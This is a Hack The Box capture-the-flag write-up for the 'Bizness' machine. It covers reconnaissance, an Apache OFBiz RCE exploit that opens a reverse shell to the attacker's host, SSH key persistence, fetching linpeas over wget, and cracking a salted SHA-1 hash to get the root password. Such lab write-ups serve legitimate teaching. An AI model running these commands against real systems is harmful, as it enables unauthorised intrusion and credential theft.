---
description: >-
  Welcome, cyber adventurers! Embark on a thrilling journey through "Bizness" on
  Hack The Box (HTB) in this Open Beta 4 edition. As you gear up for
  adrenaline-pumping challenges, I extend my best wishes
---

# 🐒 BIZNESS



![](https://i.imgur.com/br9649p.png)

### Hacking Phases for Bizness HTB:

1. Information Gathering
2. Directory Enumeration
3. Vulnerability Analysis
4. Exploitation
5. Privilege Escalation

Let's dive into the digital depths!

***

## I => Information Gathering

### Initial Reconnaissance

Our first maneuver involves deploying `nmap` for active port reconnaissance.

**Command:**

```bash
sudo nmap -p- --min-rate 10000 10.10.11.252
```

**Result Snapshot:**

* Open Ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 38621 (Unknown)
* Host Discovery: bizness.htb (10.10.11.252) discovered with significant latency.

**Action:**

* Redirected to https://bizness.htb. Updated our `/etc/hosts` file.
* Initial website visit was inconclusive.

### Visual Insight:

![BIZNESS Homepage](https://i.imgur.com/zzASPQv.png)

***

## II => Directory Enumeration

### Uncovering Hidden Gems

Using `dirsearch` to reveal obscured paths.

**Command:**

```bash
dirsearch -q -u https://bizness.htb -i 200,300-399
```

**Findings:**

* Discovered a login page at http://bizness.htb/control/login.
* Apache OFBiz in use – a potential exploit target.

### Visual Evidence:

![dirsearch OUTPUTdirsearch OUTPUT](https://i.imgur.com/CdL9GvA.png)

![Login Page](https://i.imgur.com/M9ZMA7C.png)

***

## III => Vulnerability Analysis

### Identifying the Achilles' Heel

Discovered a critical CVE for Apache OFBiz - CVE-2023-51467, indicating Remote Code Execution (RCE).

**Intel Source:**

* [READING](https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/)

***

## IV => Exploitation

### Deploying the Cyber Arsenal

Found a repository tailor-made for exploiting this CVE.

**Exploit Repository:** [CVE-2023-51467 Exploit](https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC/tree/main)

### Gaining the Foothold

**Exploit Execution:**

```bash
python3 exploit.py https://bizness.htb/ shell <IP-tun0>:<PORT>
```

**Result:**

* Successfully established a reverse shell.

**Shell Stabilization:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background the shell with ctrl + z, then:
stty raw -echo; fg
reset xterm
```

**Victory Snapshot:**&#x20;

<figure><img src="https://i.imgur.com/XKQvhAT.png" alt=""><figcaption><p><strong>I'M IN</strong></p></figcaption></figure>

**Achievement Unlocked: User Compromised**

```bash
cat ~/user.txt
# User flag acquired
```

***

## V => Privilege Escalation

### Establishing a Strong hold

**Command:**

```bash
cd /home/ofbiz/
mkdir .ssh
echo [your_public_key] > ~/.ssh/authorized_keys
```

**Secure Access:**

```bash
ssh -i [private_key] ofbiz@bizness.htb
```

### Privilege Escalation Attempts

#### Searching for SUID Files

Checked for exploitable SUID files.

**Command:**

```bash
find / -type f -perm /4000 2>/dev/null
```

**Outcome:**

* No significant SUID files found.

#### Scanning for Internal Ports

Searched for listening internal ports.

**Command:**

```bash
netstat -ano
```

**Outcome:**

* No notable internal ports detected.

#### Automated Scouting with LinPEAS

Deployed `linpeas.sh` for vulnerability scanning.

**LinPEAS Deployment:**

```bash
cd /tmp
wget http://<IP-tun0>:<port>/linpeas.sh
bash ./linpeas.sh
```

**Further Analysis:** Re-ran LinPEAS and saved output for detailed local analysis.

**On the Target Machine:**

```bash
bash ./linpeas.sh > /tmp/linpease.txt
```

**On the Local Machine:**

```bash
scp -i ~/.ssh/id_rsa ofbiz@bizness.htb:/tmp/linpease.txt ./
```

**Outcome:**

* LinPEAS did not reveal significant leads, hinting at a potential rabbit hole.

### Exploring Alternative Avenues

#### The Quest for Ultimate Power

The search for a direct escalation path was challenging, but persistence led to potential password clues.

**Password Hunt:**

```bash
grep -aRinH --color -o -E '(\w+\w+){0,5}password(\w+\w+){0,5}'
```

**Discovery:**

* Files indicating password usage.
* Encountered a SHA-1 hash and a .dat file revealing a Base64 encoded SHA1 structure.

**Crucial Discovery:**

<figure><img src="https://i.imgur.com/ESVQhRB.png" alt=""><figcaption><p><strong>Files indicating password usage.</strong> </p></figcaption></figure>

**I found this XML file and the hashed password.**

![SHA-1 password hashed](https://i.imgur.com/yASqTX5.png)

As you're aware, cracking the SHA was an insurmountable task without knowing the SALT value. Therefore, I embarked on a meticulous search through various files that contained password-related data, specifically looking for a pattern akin to `(($SHA1)($SALT)($HASH))`

<pre data-overflow="wrap" data-full-width="false"><code><strong>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
</strong></code></pre>

**Encountered a SHA-1 hash and a .dat file revealing a Base64 encoded SHA1 structure.**&#x20;

<figure><img src="https://i.imgur.com/ktA2QNo.png" alt=""><figcaption><p><strong>SHA1 structure and value</strong></p></figcaption></figure>

#### Cracking the Hash

**Python Script for Decryption:** [Script for SHA1 Decryption](https://github.com/Hunt3r0x/Bizness-htb)

**Hashcat Strategy:**

* Converted from base64 using CyberChef for Hashcat compatibility. [**CyberChef**](https://gchq.github.io/CyberChef/#recipe=Find\_/\_Replace\(%7B'option':'Regex','string':'\_'%7D,'/',false,false,false,false\)Find\_/\_Replace\(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false\)From\_Base64\('A-Za-z0-9%2B/%3D',false,false\)To\_Hex\('None',0\)\&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ)&#x20;
*   To effectively utilize Hashcat for our cracking purposes, a preliminary step of data refinement is necessary. This is due to the initial encoding using `base64.urlsafe_b64encode()`, which modifies certain characters - '/' becomes '\_', and '+' is turned into '-'. To rectify this and prepare our data accurately for Hashcat, we'll employ the capabilities of [**CyberChef**](https://gchq.github.io/CyberChef/#recipe=Find\_/\_Replace\(%7B'option':'Regex','string':'\_'%7D,'/',false,false,false,false\)Find\_/\_Replace\(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false\)From\_Base64\('A-Za-z0-9%2B/%3D',false,false\)To\_Hex\('None',0\)\&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ). This tool is adept at making the required character replacements and transforming our data into a hex format. This conversion is a critical process to ensure that the data is in the optimal format for our subsequent cracking procedures with Hashcat.

    <figure><img src="https://i.imgur.com/Dpdnk6r.png" alt=""><figcaption><p><strong>cleaning the shity hashed password</strong></p></figcaption></figure>
* Hashcat command:

```bash
hashcat -m 120 -a 0 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" rockyou.txt
```

**Eureka Moment:**&#x20;

<figure><img src="https://i.imgur.com/NxWoz8p.png" alt=""><figcaption></figcaption></figure>

```bash
Root password is: monkeybizness
```

**Final Triumph:**&#x20;

<figure><img src="https://i.imgur.com/NnHejq1.png" alt=""><figcaption><p><strong>WE FUCKED THE ROOT UP /:</strong></p></figcaption></figure>

**Command:**

```bash
su root
# Enter the password 'monkeybizness'
cat /root/root.txt
# Root flag successfully captured
```

**ANOTHER${IFS}SHITY${IFS}THING<<\<SEE${IFS}YOU/:**
